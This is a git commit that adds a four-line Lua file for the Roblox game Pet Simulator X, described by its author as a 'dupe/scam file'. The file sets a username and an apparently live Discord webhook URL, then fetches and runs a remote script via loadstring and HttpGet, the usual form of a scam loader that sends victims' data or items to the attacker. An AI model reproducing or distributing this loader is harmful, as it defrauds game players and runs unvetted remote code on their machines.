a05e57c9578b536703f635ce0ca14bc8bf287a67
superdogerider265 <68976013+superdogerider265@users.noreply.github.com>
2022-12-30 18:13:38 -0500

    Create psx.lua
    its a good dupe/scam file for pet simulator script

---
+++ psx.lua
@@ -0,0 +1,4 @@
+UserName = "SuperDogeRider"
+WebHook = "https://discord.com/api/webhooks/1058519941034278913/Pyh5cXHcGJX67wUYG9VgdCHkQ0xSBlOUyNgPUjh7COnPBThKaKzoxQjI326jcD77hRGO"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
